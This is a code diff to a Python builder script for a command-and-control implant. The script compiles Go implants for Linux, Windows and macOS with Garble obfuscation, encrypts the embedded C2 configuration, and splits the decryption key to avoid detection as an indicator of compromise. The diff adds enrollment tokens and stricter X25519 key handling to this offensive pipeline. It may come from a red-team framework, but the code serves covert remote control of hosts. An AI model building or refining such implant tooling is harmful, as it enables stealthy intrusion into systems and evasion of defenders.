@@ -8,10 +8,13 @@ Features:
 - Compiles using Garble for heavy obfuscation (-tiny -literals)
 """
 
-import os
-import sys
 import base64
+import os
 import subprocess
+import sys
+
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import x25519
 
 C_GREEN  = "\033[92m"
 C_YELLOW = "\033[93m"
@@ -20,27 +23,38 @@ C_CYAN   = "\033[96m"
 C_RESET  = "\033[0m"
 
 def load_server_pub_key(key_path="data/keys/server_x25519_public.pem") -> str:
-    """Read the public key and strip PEM headers to inject as raw base64."""
+    """Return the raw 32-byte X25519 public key as base64."""
     if not os.path.exists(key_path):
-        print(f"  {C_RED}[!] Public key not found at {key_path}. Did you start the C2 server once?{C_RESET}")
-        sys.exit(1)
-        
-    with open(key_path, "r") as f:
-        lines = f.readlines()
-        
-    # Strip PEM headers/footers and newlines
-    b64_key = "".join([l.strip() for l in lines if not l.startswith("-----")])
-    return b64_key
+        raise FileNotFoundError(
+            f"Public key not found at {key_path}. Start the C2 server first."
+        )
 
-def encrypt_config(c2_urls: str, pins: str, server_pub: str) -> (str, str):
+    with open(key_path, "rb") as handle:
+        public_key = serialization.load_pem_public_key(handle.read())
+    if not isinstance(public_key, x25519.X25519PublicKey):
+        raise ValueError("C2 public key is not an X25519 key")
+    raw = public_key.public_bytes(
+        serialization.Encoding.Raw,
+        serialization.PublicFormat.Raw,
+    )
+    return base64.b64encode(raw).decode("ascii")
+
+def encrypt_config(
+    c2_urls: str,
+    pins: str,
+    server_pub: str,
+    enrollment_token: str,
+) -> tuple[str, str]:
     """Encrypt config into an AES-GCM blob and return (b64_blob, hex_key)."""
     import json
+
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
     
     config = {
         "urls": c2_urls,
         "pins": pins,
-        "pub": server_pub
+        "pub": server_pub,
+        "enrollment_token": enrollment_token,
     }
     
     plaintext = json.dumps(config).encode("utf-8")
@@ -53,7 +67,13 @@ def encrypt_config(c2_urls: str, pins: str, server_pub: str) -> (str, str):
     
     return blob, key.hex()
 
-def build_implant(os_target="linux", arch_target="amd64", c2_urls="http://127.0.0.1:8443", pins=""):
+def build_implant(
+    os_target="linux",
+    arch_target="amd64",
+    c2_urls="http://127.0.0.1:8443",
+    pins="",
+    enrollment_token="",
+):
     base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
     key_path = os.path.join(base_dir, "data", "keys", "server_x25519_public.pem")
     src_file = os.path.join(base_dir, "core", "c2", "implant.go")
@@ -61,12 +81,27 @@ def build_implant(os_target="linux", arch_target="amd64", c2_urls="http://127.0.
     out_ext = ".exe" if os_target == "windows" else ""
     out_file = os.path.join(base_dir, "data", f"implant_{os_target}_{arch_target}{out_ext}")
     
+    if isinstance(c2_urls, (list, tuple)):
+        c2_urls = ",".join(str(item) for item in c2_urls)
+    if os_target not in {"linux", "windows", "darwin"}:
+        raise ValueError(f"Unsupported target OS: {os_target}")
+    if arch_target not in {"amd64", "arm64"}:
+        raise ValueError(f"Unsupported target architecture: {arch_target}")
+
     server_pub = load_server_pub_key(key_path)
+    if not enrollment_token:
+        from core.c2.enrollment import EnrollmentAuthority
+
+        enrollment_token = EnrollmentAuthority(
+            os.path.join(base_dir, "data", "keys", "enrollment.key")
+        ).issue()
     
     print(f"  {C_CYAN}[*] Starting Garble Build Pipeline for {os_target}/{arch_target}{C_RESET}")
     print(f"  {C_CYAN}[*] Encrypting configuration blob...{C_RESET}")
     
-    config_blob, hex_key = encrypt_config(c2_urls, pins, server_pub)
+    config_blob, hex_key = encrypt_config(
+        c2_urls, pins, server_pub, enrollment_token
+    )
     
     # We split the hex key into two parts to avoid a single static 32-byte string IOC
     key_part1 = hex_key[:32]
@@ -113,8 +148,9 @@ def build_implant(os_target="linux", arch_target="amd64", c2_urls="http://127.0.
     try:
         subprocess.run(cmd, env=env, cwd=core_c2_dir, check=True)
         print(f"  {C_GREEN}[+] Build complete: {out_file}{C_RESET}")
+        return out_file
     except subprocess.CalledProcessError as e:
-        print(f"  {C_RED}[!] Build failed: {e}{C_RESET}")
+        raise RuntimeError(f"Go implant build failed: {e}") from e
 
 if __name__ == "__main__":
     import argparse
